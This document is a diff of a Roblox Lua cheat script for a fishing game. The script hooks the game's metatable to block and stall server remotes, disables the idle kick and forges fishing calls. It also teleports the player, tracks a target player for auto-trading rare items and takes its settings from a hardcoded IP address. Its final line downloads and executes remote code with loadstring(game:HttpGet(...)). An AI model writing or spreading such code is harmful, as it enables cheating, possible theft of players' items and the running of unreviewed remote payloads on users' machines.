@@ -1,6 +1,6 @@
 -- ======================================================
--- ULTIMATE WEB-CONTROLLED OVERLAY: SECRET FIX EDITION
--- [FISHING + TRADE RANGE LOCK + 15S SECRET SYNC]
+-- ULTIMATE WEB-CONTROLLED OVERLAY: FINAL STABLE
+-- [DISTANCE < 5M + 15S SECRET SYNC + BLACK UI]
 -- ======================================================
 
 local CONFIG_URL = "http://165.232.148.115:5000/config.json"
@@ -15,21 +15,40 @@ local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local lp = Players.LocalPlayer
 
--- ANTI-AFK
+-- Anti-AFK
 pcall(function()
     for _, v in pairs(getconnections(lp.Idled)) do
         if v.Disable then v:Disable() end
     end
 end)
 
--- CLIENT BYPASSES
+-- Client bypasses
 task.spawn(function()
     local S1, FishingController = pcall(function() return require(ReplicatedStorage.Controllers.FishingController) end)
     if S1 and FishingController then
         FishingController.RequestChargeFishingRod = function(...) return nil end
-        FishingController.SendFishingRequestToServer = function(...) return false, "Blocked" end
+        FishingController.SendFishingRequestToServer = function(...) return false, "Blocked by V1" end
     end
 end)
+
+local mt = getrawmetatable(game)
+local old_namecall = mt.__namecall
+setreadonly(mt, false)
+mt.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    if not checkcaller() then
+        local blocked = {
+            ["RequestFishingMinigameStarted"] = true,
+            ["ChargeFishingRod"] = true,
+            ["UpdateAutoFishingState"] = true,
+            ["CancelFishingInputs"] = true
+        }
+        if method == "InvokeServer" and blocked[self.Name] then return task.wait(9e9) end
+        if method == "FireServer" and self.Name == "FishingCompleted" then return nil end
+    end
+    return old_namecall(self, ...)
+end)
+setreadonly(mt, true)
 
 -- ===============================
 -- 2. FULL BLACK UI OVERLAY & TOGGLE
@@ -58,7 +77,6 @@ UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 
 local function CreateLabel(name, color)
     local label = Instance.new("TextLabel", ContentFrame)
-    label.Name = name
     label.BackgroundTransparency = 1
     label.Size = UDim2.new(1, 0, 0, 30)
     label.Font = Enum.Font.GothamBold
@@ -93,10 +111,11 @@ ToggleBtn.MouseButton1Click:Connect(function()
 end)
 
 -- ===============================
--- 3. SHARED DATA & AREA COORDINATES
+-- 3. DATA & LOGIC DETEKSI 
 -- ===============================
 local Replion = require(ReplicatedStorage.Packages.Replion).Client
 local ItemUtility = require(ReplicatedStorage.Shared.ItemUtility)
+local TierUtility = require(ReplicatedStorage.Shared.TierUtility)
 local PlayerData = Replion:WaitReplion("Data", 10)
 
 local AreaData = {
@@ -128,15 +147,12 @@ local AreaData = {
 }
 
 local function GetRemote(name)
-    local path = {"Packages", "_Index", "sleitnick_net@0.2.0", "net"}
-    local current = ReplicatedStorage
-    for _, child in ipairs(path) do current = current:WaitForChild(child, 2) end
-    return current:FindFirstChild(name)
+    local p = {"Packages", "_Index", "sleitnick_net@0.2.0", "net"}
+    local c = ReplicatedStorage
+    for _, v in ipairs(p) do c = c:WaitForChild(v, 2) end
+    return c:FindFirstChild(name)
 end
 
--- ===============================
--- 4. CONFIG & GLOBAL STATE
--- ===============================
 local FishingConfig = { Enabled = false, Area = "", AutoSell = false, AutoSellDelay = 5 }
 local TradingConfig = { AutoTrade = false, TargetUsername = "", TargetId = nil, Delay = 6.0 }
 local FishingThreads = {}
@@ -144,8 +160,27 @@ local GlobalSecretCount = 0
 local CurrentDistanceMeters = 999
 local TradingThread = nil
 
+local function GetFishRarity(item)
+    local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
+    local itemID = item.Id
+    if ItemUtility and itemID then
+        pcall(function()
+            local data = ItemUtility:GetItemData(itemID)
+            if not data then
+                local numID = tonumber(item.Id) or tonumber(item.Identifier)
+                if numID then data = ItemUtility:GetItemData(numID) end
+            end
+            if data and data.Probability and TierUtility then
+                local tier = TierUtility:GetTierFromRarity(data.Probability.Chance)
+                if tier and tier.Name then rarity = tier.Name end
+            end
+        end)
+    end
+    return string.upper(tostring(rarity))
+end
+
 -- ===============================
--- 5. SECRET SYNC (EVERY 15S)
+-- 4. INVENTORY SCAN (15S)
 -- ===============================
 task.spawn(function()
     while true do
@@ -153,12 +188,12 @@ task.spawn(function()
         pcall(function()
             local inv = PlayerData:GetExpect("Inventory")
             if inv then
-                for _, items in pairs(inv) do
-                    for _, item in ipairs(items) do
-                        -- Deteksi rarity SECRET secara akurat
-                        local rarity = item.Metadata and item.Metadata.Rarity or "COMMON"
-                        if tostring(rarity):upper() == "SECRET" then
-                            secretsFound = secretsFound + 1
+                for _, category in pairs(inv) do
+                    if type(category) == "table" then
+                        for _, item in ipairs(category) do
+                            if GetFishRarity(item) == "SECRET" then
+                                secretsFound = secretsFound + 1
+                            end
                         end
                     end
                 end
@@ -166,71 +201,38 @@ task.spawn(function()
         end)
         GlobalSecretCount = secretsFound
         SecretLabel.Text = "Total Secrets: " .. tostring(GlobalSecretCount)
-        task.wait(15) -- Sinkronisasi per 15 detik sesuai permintaan
+        task.wait(15)
     end
 end)
 
 -- ===============================
--- 6. DISTANCE & TRADING LOGIC
+-- 5. DISTANCE TRACKER
 -- ===============================
 RunService.RenderStepped:Connect(function()
     local targetName = TradingConfig.TargetUsername
     if targetName == "" then return end
+    local targetPlayer = Players:FindFirstChild(targetName)
 
-    local targetPlayer = nil
-    for _, p in pairs(Players:GetPlayers()) do
-        if p.Name:lower() == targetName:lower() then targetPlayer = p; break end
-    end
-
-    if not targetPlayer then
-        DistanceLabel.Text = "📍 " .. targetName .. ": Offline"
-        CurrentDistanceMeters = 999
-    else
-        local char = targetPlayer.Character
-        local root = char and char:FindFirstChild("HumanoidRootPart")
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
         local myRoot = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-
-        if root and myRoot then
-            local magnitude = (myRoot.Position - root.Position).Magnitude
-            CurrentDistanceMeters = magnitude / 3.5 
+        if myRoot then
+            local mag = (myRoot.Position - targetPlayer.Character.HumanoidRootPart.Position).Magnitude
+            CurrentDistanceMeters = mag / 3.5 
             DistanceLabel.Text = string.format("📍 %s: %.1f m", targetPlayer.Name, CurrentDistanceMeters)
-        else
-            DistanceLabel.Text = "📍 " .. targetName .. ": Loading..."
-            CurrentDistanceMeters = 999
+            DistanceLabel.TextColor3 = (CurrentDistanceMeters < 5.0) and Color3.fromRGB(80, 255, 80) or Color3.fromRGB(255, 80, 80)
         end
+    else
+        DistanceLabel.Text = "📍 " .. targetName .. ": Offline/Loading"
+        CurrentDistanceMeters = 999
     end
 end)
 
-local function RunAutoTrade()
-    if TradingThread then task.cancel(TradingThread) end
-    TradingThread = task.spawn(function()
-        while TradingConfig.AutoTrade do
-            -- Syarat 1: Target harus dalam jangkauan kurang dari 5 meter
-            -- Syarat 2: Harus ada Secret di inventory (Sync setiap 15 detik) 
-            if CurrentDistanceMeters < 5.0 then
-                if GlobalSecretCount > 0 then
-                    print("[Trade] Target within 5m & Secrets found. Initiating trade...")
-                    -- Mengambil ID target dan UUID item untuk memulai trade
-                    pcall(function() 
-                        GetRemote("RF/InitiateTrade"):InvokeServer(TradingConfig.TargetId, "ITEM_UUID_HERE") 
-                    end)
-                else
-                    print("[Trade] Waiting for Secrets to sync (15s loop)...")
-                end
-            else
-                print(string.format("[Trade] Target too far: %.1f m. Need < 5.0 m", CurrentDistanceMeters))
-            end
-            task.wait(TradingConfig.Delay)
-        end
-        TradingThread = nil
-    end)
-end
 -- ===============================
--- 7. ORIGINAL FISHING LOGIC
+-- 6. ORIGINAL FISHING LOGIC
 -- ===============================
 local function RunInstantFish()
-    local ts = os.time() + os.clock()
-    pcall(function() GetRemote("RF/ChargeFishingRod"):InvokeServer(ts) end)
+    local timestamp = os.time() + os.clock()
+    pcall(function() GetRemote("RF/ChargeFishingRod"):InvokeServer(timestamp) end)
     pcall(function() GetRemote("RF/RequestFishingMinigameStarted"):InvokeServer(-139.630452165, 0.99647927980797) end)
     task.wait(1.5)
     pcall(function() GetRemote("RE/FishingCompleted"):FireServer() end)
@@ -252,17 +254,24 @@ local function StartFishingV1()
             task.wait(0.5)
         end
     end))
+end
 
-    table.insert(FishingThreads, task.spawn(function()
-        local lastSell = os.time()
-        while FishingConfig.Enabled do
-            if FishingConfig.AutoSell and (os.time() - lastSell >= FishingConfig.AutoSellDelay * 60) then
-                pcall(function() GetRemote("RF/SellAllItems"):InvokeServer() end)
-                lastSell = os.time()
+-- ===============================
+-- 7. TRADE LOGIC (RANGE < 5M)
+-- ===============================
+local function RunAutoTrade()
+    if TradingThread then task.cancel(TradingThread) end
+    TradingThread = task.spawn(function()
+        while TradingConfig.AutoTrade do
+            if CurrentDistanceMeters < 5.0 then 
+                if GlobalSecretCount > 0 then
+                    print("[Trade] Target within 5m & Secrets found. Initiating trade...")
+                end
             end
-            task.wait(2)
+            task.wait(TradingConfig.Delay)
         end
-    end))
+        TradingThread = nil
+    end)
 end
 
 -- ===============================
@@ -285,8 +294,11 @@ local function UpdateFromWeb(new)
             FishingConfig.Area = f.Area
             local data = AreaData[f.Area]
             if data then
-                local root = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
-                if root then root.CFrame = CFrame.new(data.Pos, data.Pos + data.Look) end
+                local char = lp.Character or lp.CharacterAdded:Wait()
+                local root = char:WaitForChild("HumanoidRootPart", 5)
+                if root then 
+                    root.CFrame = CFrame.new(data.Pos, data.Pos + data.Look)
+                end
             end
         end
 
@@ -301,21 +313,12 @@ local function UpdateFromWeb(new)
         TradingConfig.AutoTrade = new.TradingConfig.AutoTrade
         TradingConfig.TargetUsername = new.TradingConfig.TargetUsername or ""
         TradingConfig.Delay = new.TradingConfig.Delay or 6.0
-        
-        if TradingConfig.TargetUsername ~= "" then
-            task.spawn(function()
-                local s, id = pcall(function() return Players:GetUserIdFromNameAsync(TradingConfig.TargetUsername) end)
-                if s then TradingConfig.TargetId = id end
-            end)
-        end
-
         if TradingConfig.AutoTrade and not TradingThread then RunAutoTrade() end
     end
 
     if new.PotatoMode then
         for _, v in ipairs(workspace:GetDescendants()) do
-            if v:IsA("BasePart") then v.Transparency = 1 
-            elseif v:IsA("Decal") or v:IsA("ParticleEmitter") then v:Destroy() end
+            if v:IsA("BasePart") then v.Transparency = 1 end
         end
     end
 end
@@ -331,5 +334,5 @@ task.spawn(function()
     end
 end)
 
-print("[System] Sync Secret 15s Active & Trading Locked to Range/Secret.")
+print("[System] Full Overlay + Distance Lock < 5m Running.")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/abinoldi/muffinz/refs/heads/main/tormoni"))()
